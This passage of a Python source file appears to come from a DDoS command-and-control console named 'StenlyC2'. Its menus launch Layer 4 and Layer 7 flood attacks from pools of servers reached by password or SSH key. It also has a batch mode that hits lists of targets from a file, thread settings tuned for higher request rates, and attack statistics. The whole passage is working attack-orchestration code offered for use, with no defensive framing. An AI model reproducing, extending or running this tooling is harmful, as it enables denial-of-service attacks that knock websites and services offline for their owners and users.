        print(f"{R}[-] No L7 capable servers!{D}")
        input()
        return
    
    banner()
    print(f"{BD}{P}LAUNCH L7 ATTACK{D}\n")
    
    total_cpu = sum([s.get('cpu', 2) for s in pwd + key])
    print(f"PWD: {len(pwd)} | KEY: {len(key)} | CPU: {total_cpu} cores\n")
    
    print(f"{BD}1{D}.Password Only")
    print(f"{BD}2{D}.SSH Key Only")
    print(f"{BD}3{D}.ALL Servers")
    ch = input(f"\n{Y}Select pool: {D}")
    
    if ch == '1':
        srvs = pwd
    elif ch == '2':
        srvs = key
    else:
        srvs = pwd + key
    
    if not srvs:
        return
    
    try:
        url = input(f"\n{Y}Target URL: {D}")
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        dur = int(input(f"{Y}Duration(s)[60]: {D}") or "60")
        
        print(f"\n{BD}METHODS:{D}")
        for k, (m, d) in L7_METHODS.items():
            print(f"{k}.{m} - {d}")
        meth = L7_METHODS.get(input(f"{Y}Select(1-6): {D}"), ('GOD_L7', ''))[0]
        
        avg_cpu = sum([s.get('cpu', 2) for s in srvs]) / len(srvs)
        sugg = int(avg_cpu * 200)
        thr = int(input(f"\n{Y}Threads/server[{sugg}]: {D}") or str(sugg))
        
        est_rps = thr * 50 * len(srvs)
        
        print(f"\n{BD}ESTIMATE:{D}")
        print(f"RPS: {fmt_num(est_rps)}")
        
        if input(f"\n{R}START ATTACK? (y/n): {D}").lower() == 'y':
            attack_l7(srvs, url, dur, meth, thr, data)
            input(f"\n{G}Press Enter...{D}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{D}")
        input()

def batch_attack(data):
    active = [s for s in data['servers_pwd'] + data['servers_key'] if s.get('active')]
    
    if not active:
        print(f"{R}[-] No active servers!{D}")
        input()
        return
    
    banner()
    print(f"{BD}{Y}BATCH ATTACK{D}\n")
    print("Format: target:port:duration:method (L4) or url:duration:method (L7)")
    path = input("Target file: ")
    
    if not os.path.exists(path):
        print(f"{R}[-] File not found!{D}")
        input()
        return
    
    targets = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                parts = line.split(':')
                if len(parts) >= 3:
                    if parts[0].startswith('http'):
                        url = ':'.join(parts[:-2])
                        targets.append(('L7', url, int(parts[-2]), parts[-1]))
                    else:
                        targets.append(('L4', parts[0], int(parts[1]), int(parts[2]), parts[3]))
    
    print(f"{G}[+] Loaded {len(targets)} targets{D}")
    
    for i, t in enumerate(targets, 1):
        print(f"\n{BD}[{i}/{len(targets)}]{D}")
        
        if t[0] == 'L4':
            ip, port, dur, meth = t[1], t[2], t[3], t[4]
            print(f"{C}L4: {ip}:{port} | {meth} | {dur}s{D}")
            avg_cpu = sum([s.get('cpu', 2) for s in active]) / len(active)
            thr = int(avg_cpu * 500)
            attack_l4(active, ip, port, dur, meth, thr, data)
        else:
            url, dur, meth = t[1], t[2], t[3]
            print(f"{P}L7: {url} | {meth} | {dur}s{D}")
            avg_cpu = sum([s.get('cpu', 2) for s in active]) / len(active)
            thr = int(avg_cpu * 200)
            attack_l7(active, url, dur, meth, thr, data)
        
        if i < len(targets):
            print(f"{Y}[*] Waiting 10s...{D}")
            time.sleep(10)
    
    input(f"\n{G}Press Enter...{D}")

def show_stats(data):
    banner()
    print(f"{BD}{C}STATISTICS{D}\n")
    
    s = data['stats']
    l7 = data.get('l7_stats', {})
    
    pwd_total = len(data['servers_pwd'])
    pwd_act = len([s for s in data['servers_pwd'] if s.get('active')])
    key_total = len(data['servers_key'])
    key_act = len([s for s in data['servers_key'] if s.get('active')])
    
    print(f"{BD}SERVERS:{D}")
    print(f"Password: {pwd_act}/{pwd_total} active")
    print(f"SSH Key: {key_act}/{key_total} active")
    print(f"Proxies: {len([p for p in data.get('proxies', []) if p.get('active')])}")
    
    print(f"\n{BD}L4 STATS:{D}")
    print(f"Attacks: {s.get('attacks', 0)}")
    print(f"Packets: {fmt_num(s.get('packets', 0))}")
    
    print(f"\n{BD}L7 STATS:{D}")
    print(f"Requests: {fmt_num(s.get('requests', 0))}")
    print(f"HTTP 2xx: {l7.get('http_2xx', 0)}")
    print(f"HTTP 4xx: {l7.get('http_4xx', 0)}")
    print(f"HTTP 5xx: {l7.get('http_5xx', 0)}")
    
    print(f"\n{BD}TOTAL:{D}")
    print(f"Data: {s.get('bytes', 0)/1024/1024/1024:.2f} GB")
    print(f"Time: {s.get('time', 0)/60:.1f} minutes")
    
    hist = data.get('attack_history', [])[-5:]
    if hist:
        print(f"\n{BD}RECENT ATTACKS:{D}")
        for h in hist:
            ts = datetime.fromtimestamp(h.get('timestamp', 0)).strftime('%H:%M:%S')
            print(f"{ts} | {h.get('type')} | {h.get('target', 'N/A')[:20]}...")
    
    input(f"\n{G}Press Enter...{D}")

def main():
    if not os.path.exists('attack.go'):
        print(f"{Y}[!] Warning: attack.go (L4) not found{D}")
    if not os.path.exists('attackl7.go'):
        print(f"{Y}[!] Warning: attackl7.go (L7) not found{D}")
    time.sleep(1)
    
    data = load_db()
    
    while True:
        banner()
        
        pwd_act = len([s for s in data['servers_pwd'] if s.get('active')])
        key_act = len([s for s in data['servers_key'] if s.get('active')])
        attacks = data['stats'].get('attacks', 0)
        
        print(f"{C}Active: PWD={pwd_act} | KEY={key_act} | Attacks={attacks}{D}\n")
        
        print(f"{BD}SERVER MANAGEMENT:{D}")
        print(f"{BD}1{D}.Password(L4) {BD}2{D}.SSHKey(L4) {BD}3{D}.Password(L7) {BD}4{D}.SSHKey(L7)")
        print(f"\n{BD}OPERATIONS:{D}")
        print(f"{BD}5{D}.Proxies {BD}6{D}.AttackL4 {BD}7{D}.AttackL7 {BD}8{D}.Batch {BD}9{D}.Stats {BD}0{D}.Exit")
        
        ch = input(f"\n{Y}StenlyC2> {D}")
        
        if ch == '1':
            menu_pwd(data, 'l4')
        elif ch == '2':
            menu_key(data, 'l4')
        elif ch == '3':
            menu_pwd(data, 'l7')
        elif ch == '4':
            menu_key(data, 'l7')
        elif ch == '5':
            menu_proxy(data)
        elif ch == '6':
            launch_l4(data)
        elif ch == '7':
            launch_l7(data)
        elif ch == '8':
            batch_attack(data)
        elif ch == '9':
            show_stats(data)
        elif ch == '0':
            print(f"{G}Bye.{D}")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}Interrupted.{D}")
    except Exception as e:
        print(f"\n{R}Fatal: {e}{D}")
